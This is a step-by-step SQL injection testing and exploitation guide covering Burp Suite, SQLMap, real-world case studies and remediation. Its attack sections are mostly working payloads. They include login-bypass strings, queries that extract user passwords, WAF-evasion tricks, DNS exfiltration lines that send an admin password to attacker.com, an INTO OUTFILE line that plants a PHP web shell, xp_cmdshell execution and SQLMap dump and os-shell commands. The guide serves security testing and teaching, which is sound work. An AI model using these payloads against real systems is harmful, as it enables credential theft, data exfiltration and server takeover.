# Complete SQL Injection Testing Methodology

## Introduction

SQL Injection (SQLi) remains one of the most critical web application vulnerabilities. This methodology provides a structured approach to testing for and exploiting SQL injection vulnerabilities using real-world examples, tools like Burp Suite and SQLMap, and techniques that have been proven effective in actual security assessments.

---

## Phase 1: Reconnaissance and Target Identification

### Understanding Where SQL Injection Occurs

SQL injection vulnerabilities can appear anywhere the application interacts with a database. Common locations include:

- **Login forms** - Username and password fields
- **Search functionality** - Search boxes and filters
- **URL parameters** - `id=1`, `page=2`, `category=5`
- **API endpoints** - JSON/XML data in POST requests
- **HTTP headers** - User-Agent, Referer, Cookie, X-Forwarded-For
- **Hidden form fields** - Values submitted via POST

### Mapping the Attack Surface

Before testing, identify all user-controllable inputs. For each parameter, note:

1. The HTTP method (GET, POST, PUT, DELETE)
2. The data format (URL-encoded, JSON, XML, multipart)
3. Any visible input validation or filtering
4. The application's behavior with valid vs invalid inputs

**Real-World Example - Zomato (2017):**
A security researcher discovered SQL injection in a JSON array parameter called `brids` . The vulnerable request looked like:

```http
POST /████.php?res_id={RES_ID} HTTP/1.1
Host: www.zomato.com
Content-Type: application/x-www-form-urlencoded

action=show_support_breakups&brids=["')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23"]
```

The injection occurred in a JSON array parameter, demonstrating that modern APIs with structured data formats are equally vulnerable.

---

## Phase 2: Detection and Confirmation

### Manual Detection Techniques

The first step in detection is breaking the SQL query to observe the application's response.

**Basic Test Strings to Try:**

| Payload | Purpose | Expected Behavior if Vulnerable |
|---------|---------|--------------------------------|
| `'` | Break string delimiter | SQL error, 500 error, or changed response |
| `"` | Break string delimiter (alternative) | SQL error, 500 error, or changed response |
| `' OR '1'='1` | Always true condition | Different content or successful login |
| `' AND '1'='2` | Always false condition | No results or login failure |
| `'-- -` | Comment out rest of query | Different behavior than single quote alone |
| `'#` | MySQL comment | Different behavior than single quote alone |
| `';` | Statement terminator | Potential error or changed behavior |

**Testing Process:**

1. Submit a legitimate request and note the response
2. Add a single quote to the parameter and resubmit
3. Compare responses - look for:
   - Database error messages
   - Different page content
   - HTTP 500 status codes
   - Missing expected content

**Real-World Example - Boelter Blue System Management (CVE-2024-36840):**

The `news_details.php` endpoint was vulnerable in the `id` parameter . The researcher confirmed the vulnerability by comparing:

```
Normal request: id=10071 → Returns expected content
Test request: id=10071' → Different behavior indicating SQL error
Boolean test: id=10071 AND 4036=4036 → Normal response (true condition)
Boolean test: id=10071 AND 4036=4037 → Different response (false condition)
```

This confirmed the parameter was injectable using boolean-based blind SQL injection.

### Using Burp Suite for Detection

Burp Suite provides multiple approaches for SQL injection detection .

**Method 1: Active Scanning (Burp Professional)**

1. Navigate to **Proxy > HTTP History**
2. Right-click on the request containing the parameter you want to test
3. Select **Do Active Scan**
4. Burp Scanner automatically tests for SQL injection by:
   - Inserting SQL-specific payloads
   - Analyzing responses for error patterns
   - Testing boolean conditions
   - Checking time-based delays

**Method 2: Manual Fuzzing with Burp Intruder**

For manual testing or when using Burp Community Edition :

1. **Capture the request** in Burp Proxy
2. **Send to Intruder** (Right-click > Send to Intruder)
3. **Configure payload position** - Highlight the parameter value and click "Add §"
4. **Load payloads** - In the Payloads tab, add a list of SQL fuzz strings:
   - If using Professional: Use built-in "Fuzzing - SQL" wordlist
   - If using Community: Manually add common SQL injection payloads
5. **Configure payload processing** - Replace placeholders like `{base}` and `{domain}` with actual values
6. **Start attack** - Click "Start Attack"
7. **Analyze results** - Look for:
   - Responses with different lengths (UNION success)
   - Responses containing database errors
   - Responses with time delays
   - HTTP status code differences

**Login Bypass Testing with Burp Repeater:**

A classic SQL injection scenario is bypassing authentication . Here's the methodology:

**Step 1:** Navigate to the login page and enter:
- Username: `administrator`
- Password: (any random value)

**Step 2:** Intercept the POST request in Burp Proxy. The request will look similar to:

```http
POST /login HTTP/1.1
Host: vulnerable-lab.com
Content-Type: application/x-www-form-urlencoded

username=administrator&password=xyz123
```

**Step 3:** Send the request to Repeater (Ctrl+R)

**Step 4:** Modify the username parameter to:

```
username=administrator'--
```

**Step 5:** Send the request. If successful, you receive a 302 redirect instead of a "login failed" message .

**Why This Works:**

The application likely executes a query similar to:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'xyz123'
```

The `--` sequence comments out the remainder of the SQL query, effectively removing the password check entirely. The query becomes:

```sql
SELECT * FROM users WHERE username = 'administrator'
```

If the user exists, authentication succeeds regardless of the password provided.

### Time-Based Detection

When error messages are suppressed and boolean differences are invisible, time delays confirm injection:

**MySQL:**
```
' AND SLEEP(5)--
' OR SLEEP(5)=' 
```

**PostgreSQL:**
```
' OR pg_sleep(5)--
' || pg_sleep(5)--
```

**MSSQL:**
```
'; WAITFOR DELAY '0:0:5'--
'); WAITFOR DELAY '0:0:5'--
```

**Oracle:**
```
' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
' OR 1=DBMS_LOCK.SLEEP(5)--
```

If the response is delayed by approximately 5 seconds, the parameter is vulnerable to time-based blind SQL injection.

---

## Phase 3: Automated Detection with SQLMap

SQLMap is the industry-standard tool for automated SQL injection detection and exploitation. It ships standard with Kali Linux and other penetration testing distributions .

### Basic SQLMap Usage

**Initial Detection Scan:**

```bash
sqlmap -u "http://testphp.vulnweb.com/search.php?test=query"
```

When run against a vulnerable target, SQLMap provides a comprehensive report :

```
Parameter: test (GET)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: test=hello' AND EXTRACTVALUE(8093,CASE WHEN (8093=8093) THEN 8093 ELSE 0x3A END)-- MmxA

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: test=hello' AND GTID_SUBSET(CONCAT(0x71717a7071,(SELECT (ELT(6102=6102,1))),0x716b7a7671),6102)-- Jfrr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: test=hello' AND (SELECT 8790 FROM (SELECT(SLEEP(5)))hgWd)-- UhkS

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: test=hello' UNION ALL SELECT NULL,CONCAT(0x71717a7071,0x51704d49566c48796b726a5558784e6642746b716a77776e6b777a51756f6f6b79624b5650585a67,0x716b7a7671),NULL#
```

This output reveals that the parameter is vulnerable to four different SQL injection techniques, and the backend is MySQL version 5.0.12 or higher .

### Key SQLMap Commands

| Command | Purpose |
|---------|---------|
| `sqlmap -u "URL" --dbs` | List all databases |
| `sqlmap -u "URL" -D database --tables` | List tables in a specific database |
| `sqlmap -u "URL" -D database -T table --columns` | List columns in a specific table |
| `sqlmap -u "URL" -D database -T table --dump` | Extract data from the table |
| `sqlmap -u "URL" --batch` | Run with default answers (non-interactive) |
| `sqlmap -u "URL" --level=3 --risk=2` | Increase thoroughness (level 1-5, risk 1-3) |
| `sqlmap -u "URL" --os-shell` | Attempt operating system shell access |

### Complete SQLMap Testing Workflow

**Step 1: Enumerate Databases**

```bash
sqlmap -u "http://testphp.vulnweb.com/search.php?test=query" --dbs
```

This reveals all databases accessible through the vulnerable parameter .

**Step 2: Enumerate Tables**

```bash
sqlmap -u "http://testphp.vulnweb.com/search.php?test=query" -D acuart --tables
```

The output shows tables within the selected database. Look for interesting names like `users`, `admin`, `customers`, `passwords`.

**Step 3: Enumerate Columns**

```bash
sqlmap -u "http://testphp.vulnweb.com/search.php?test=query" -D acuart -T users --columns
```

This reveals the structure of the table, including column names like `id`, `username`, `password`, `email`.

**Step 4: Extract Data**

```bash
sqlmap -u "http://testphp.vulnweb.com/search.php?test=query" -D acuart -T users --dump
```

SQLMap extracts all data from the table and saves it locally .

### SQLMap for POST Requests

When the vulnerable parameter is in a POST request:

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" -p username
```

The `-p` flag specifies which parameter to test. If not specified, SQLMap tests all parameters.

### SQLMap with Cookie Authentication

For authenticated testing:

```bash
sqlmap -u "http://target.com/profile.php?id=1" --cookie="PHPSESSID=abc123def456"
```

### Real-World SQLMap Usage - Boelter Blue (CVE-2024-36840)

The security researchers who discovered this vulnerability used SQLMap for exploitation :

```bash
# For news_details.php
sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --threads=4 --dbs

# For services.php (with WAF bypass tamper script)
sqlmap -u "https://www.example.com/services.php?section=5081" --random-agent --tamper=space2comment --threads=8 --dbs
```

The `--random-agent` flag randomizes the User-Agent header to avoid detection. The `--tamper=space2comment` script replaces spaces with comments to bypass simple WAF rules .

---

## Phase 4: Exploitation Techniques

### Technique 1: Union-Based SQL Injection

Union-based injection is the most direct technique when the application displays query results on the page.

**Step 1: Determine Column Count**

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Continue until an error occurs. The last successful number is the maximum column count.

Alternatively:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Step 2: Identify Displayable Columns**

```
' UNION SELECT 1,2,3,4,5--
```

The numbers that appear in the response indicate which columns are displayed.

**Step 3: Extract Data**

Once displayable columns are identified, replace numbers with data extraction queries:

```sql
' UNION SELECT database(),user(),version(),4,5--
' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--
' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,3,4,5 FROM users--
```

### Technique 2: Boolean-Based Blind SQL Injection

When the application doesn't display data but behaves differently based on query results:

**Detection Pattern:**
```
' AND 1=1--           → Normal response
' AND 1=2--           → Different response (error or missing content)
```

**Data Extraction - Character by Character:**

```
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--
```

Continue until the correct character is found, then move to position 2.

**Real-World Example - Zomato Boolean SQLi:**

The researcher used a boolean injection to identify the MySQL version :

```
MID(0x352e362e33332d6c6f67,1,1)//LIKE//5
```

This extracted the first character of the version string (hex `0x352e...` decodes to "5.6.33-log") and compared it to "5". A 500 HTTP status indicated the condition was true, while a 200 status indicated false.

### Technique 3: Time-Based Blind SQL Injection

When no visible differences exist in responses:

**MySQL:**
```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
```

**PostgreSQL:**
```sql
' || CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**MSSQL:**
```sql
'; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') WAITFOR DELAY '0:0:5'--
```

If the response is delayed by approximately 5 seconds, the character is correct.

### Technique 4: Error-Based SQL Injection

Error-based injection leverages database error messages to leak data directly.

**MySQL:**
```sql
' AND extractvalue(1,concat(0x7e,version(),0x7e))--
' AND updatexml(1,concat(0x7e,user(),0x7e),1)--
' AND GTID_SUBSET(version(),0)--
```

**MSSQL:**
```sql
' OR 1=CONVERT(int, @@version)--
' OR 1=CAST((SELECT DB_NAME()) AS int)--
```

---

## Phase 5: Advanced Exploitation

### Authentication Bypass

The most common SQL injection scenario is bypassing login forms .

**Basic Bypass Payloads:**
```
Username: admin'--
Username: ' OR '1'='1
Username: admin' OR 1=1--
Username: ' UNION SELECT 'admin', 'password' FROM users--
```

**Complete Authentication Bypass Methodology:**

1. Intercept the login POST request in Burp Proxy
2. Send to Repeater
3. Test each payload in the username field
4. Look for redirect responses (302) or successful login indicators
5. When successful, use "Show in browser" in Burp to access the authenticated session 

### Data Extraction via Out-of-Band (DNS) Techniques

When standard techniques fail, use DNS exfiltration.

**MSSQL DNS Exfiltration:**
```sql
'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='admin'); exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
```

**Oracle DNS Exfiltration:**
```sql
' AND 1=UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='admin')||'.attacker.com')--
```

**PostgreSQL DNS Exfiltration:**
```sql
'; SELECT * FROM dblink('host='||(SELECT password FROM users LIMIT 1)||'.attacker.com user=test dbname=test','SELECT 1') RETURNS (result int)--
```

### File System Access

**MySQL File Read:**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd')--
```

**MySQL File Write (Web Shell):**
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"--
```

**MSSQL Command Execution:**
```sql
'; EXEC xp_cmdshell 'whoami'--
```

---

## Phase 6: Tools and Automation

### Burp Suite Extensions

**Agartha Extension :**

This comprehensive extension provides:
- Payload generation for SQL injection with WAF bypass techniques
- Authorization matrix for privilege escalation testing
- Automated HTTP 403 bypass testing
- BCheck code generation for automated scanning

To use Agartha for SQL injection:
1. Navigate to the Payload Generator tab
2. Select "SQLi" attack type
3. Configure options (database type, WAF bypass, encoding)
4. Click "Generate the Payloads" to create a wordlist
5. Use the generated list with Burp Intruder

### Custom SQL Injection Framework

For programmatic testing, the `sqlinjector` Python framework provides :

```python
from sqlinjector import SQLInjector
from sqlinjector.models import ScanConfig

# Configure scan
config = ScanConfig(
    url="https://vulnerable-app.com/search.php?q=test",
    method=HttpMethod.GET,
    delay=0.5,
    max_payloads_per_type=15
)

# Run scanner
scanner = VulnerabilityScanner(config)
result = await scanner.scan()

for vuln in result.vulnerabilities:
    print(f"Found {vuln.injection_type.value} in {vuln.parameter}")
```

Command line usage:
```bash
sqlinjector scan https://vulnerable-app.com/page.php?id=1 --params id --injection-types boolean_blind time_blind
```

### Testing on Practice Environments

Before testing on live targets, practice on legitimate vulnerable applications:

- **OWASP Juice Shop** - Deliberately vulnerable web application 
- **testphp.vulnweb.com** - Acunetix's test site for SQL injection practice 
- **PortSwigger Web Security Academy** - Free labs with various SQL injection scenarios 

To set up OWASP Juice Shop locally with Docker :
```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

---

## Phase 7: WAF Bypass Techniques

### Character Encoding

```
Single quote: %27, %u0027, %uff07, \x27
Space: %20, %09 (tab), %0a (newline), %0d (carriage return)
```

### Comment-Based Bypass

```
MySQL versioned comment: /*!50000SELECT*/ * FROM users
Nested comments: /*!12345UNION/*/*/ /*!12345SELECT*/ 1,2,3
Inline comments: SEL/*foo*/ECT * FROM/*bar*/users
```

### Space Substitution

```
Tab: %09
Newline: %0a
Parentheses: SELECT(id)FROM(users)
Comments: SELECT/**/*/**/FROM/**/users
```

### Case Variation

```
SeLeCt * FrOm UsErS
sElEcT * fRoM uSeRs
```

### SQLMap Tamper Scripts

SQLMap includes tamper scripts that modify payloads to bypass WAFs :

```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

Common tamper scripts:
- `space2comment` - Replaces spaces with `/**/`
- `randomcase` - Randomizes case of keywords
- `between` - Replaces `>` with `BETWEEN` and `=`
- `chardoubleencode` - Double URL-encodes characters

---

## Phase 8: Real-World Attack Examples

### Case Study 1: Zomato Boolean SQL Injection (2017)

**Vulnerability:** The `brids` parameter, which accepted a JSON array, was vulnerable to boolean-based blind SQL injection .

**Detection Payload:**
```http
POST /████.php?res_id={RES_ID} HTTP/1.1
Host: www.zomato.com

action=show_support_breakups&brids=["')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23"]
```

**How It Worked:**
1. The JSON array value `')` closed the existing SQL string
2. `OR` added a conditional statement
3. `MID(hex,1,1)` extracted the first character of the version hex string
4. `LIKE 5` compared it to the character "5"
5. A 500 response (true) vs 200 response (false) indicated the MySQL version started with "5"

**Impact:** The researcher could extract database version, table names, and user data through boolean inference.

### Case Study 2: Boelter Blue System Management (CVE-2024-36840)

**Vulnerability:** Multiple SQL injection vulnerabilities in `news_details.php`, `services.php`, and `location_details.php` .

**Attack Vectors:**

1. **Boolean-based blind in `news_details.php?id`** :
   ```
   id=10071 AND 4036=4036 (true condition)
   id=10071 AND 4036=4037 (false condition)
   ```

2. **Time-based blind in `services.php?section`** :
   ```
   section=5081 AND (SELECT 2101 FROM (SELECT(SLEEP(5)))nmcL)
   ```

3. **UNION-based injection** :
   ```
   id=-5819 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170766b71,0x646655514b72686177544968656d6e414e4678595a666f77447a57515750476751524f5941496b55,0x7162626a71),NULL-- -
   ```

**Exploitation Results:**
The attacker could extract:
- Admin credentials
- User email addresses and password hashes
- Device hashes
- Purchase history
- Database credentials

**SQLMap Command Used:**
```bash
sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --threads=4 --dbs
```

### Case Study 3: PortSwigger Authentication Bypass Lab

**Vulnerability:** Login form vulnerable to SQL injection .

**Exploitation Steps:**
1. Navigated to login page
2. Entered username `administrator` and any password
3. Intercepted POST request in Burp Proxy
4. Modified username to `administrator'--`
5. Forwarded request - received 302 redirect
6. Used "Show in browser" to access admin panel

**Why It Succeeded:**
The backend query was constructed as:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

After injection:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'anything'
```

The `--` commented out the password check, making the query effectively:
```sql
SELECT * FROM users WHERE username = 'administrator'
```

---

## Phase 9: Testing Checklist

### Pre-Testing
- [ ] Obtain written authorization to test
- [ ] Define scope (which URLs, parameters, methods)
- [ ] Set up testing environment (Burp Suite, SQLMap)
- [ ] Configure proxy and certificate

### Manual Testing
- [ ] Test each parameter with single quote (`'`)
- [ ] Test with double quote (`"`)
- [ ] Test boolean conditions (`' AND '1'='1` vs `' AND '1'='2`)
- [ ] Test time delays (`' AND SLEEP(5)--`)
- [ ] Test comment characters (`--`, `#`, `/* */`)
- [ ] Test stacked queries (`'; SELECT 1--`)

### Automated Testing
- [ ] Run Burp Active Scan (Professional)
- [ ] Run SQLMap basic detection
- [ ] Run SQLMap with increased level/risk
- [ ] Run SQLMap with tamper scripts for WAF bypass

### Exploitation (if authorized)
- [ ] Extract database names
- [ ] Extract table names
- [ ] Extract column names
- [ ] Extract sensitive data
- [ ] Test for file read/write
- [ ] Test for command execution

### Reporting
- [ ] Document vulnerable parameters
- [ ] Capture proof-of-concept requests/responses
- [ ] Assess data sensitivity exposed
- [ ] Provide remediation recommendations

---

## Remediation Recommendations

### For Developers

**Use Parameterized Queries (Prepared Statements):**

```java
// Java - JDBC
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement ps = connection.prepareStatement(query);
ps.setString(1, username);
```

```python
# Python - SQLite/MySQL
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

```php
// PHP - PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
```

### For Security Teams

- **Input validation** - Whitelist allowed characters when possible
- **Least privilege** - Application database user should have minimal permissions
- **WAF implementation** - Deploy Web Application Firewall with SQL injection rules
- **Regular testing** - Conduct automated and manual SQL injection testing
- **Error handling** - Configure generic error messages, never expose database errors

---

## Legal and Ethical Considerations

**IMPORTANT:** SQL injection testing without explicit written permission is illegal in most jurisdictions. Only test:
- Your own applications
- Systems you have written authorization to test
- Bug bounty programs with clear scope definitions
- Practice environments designed for security testing
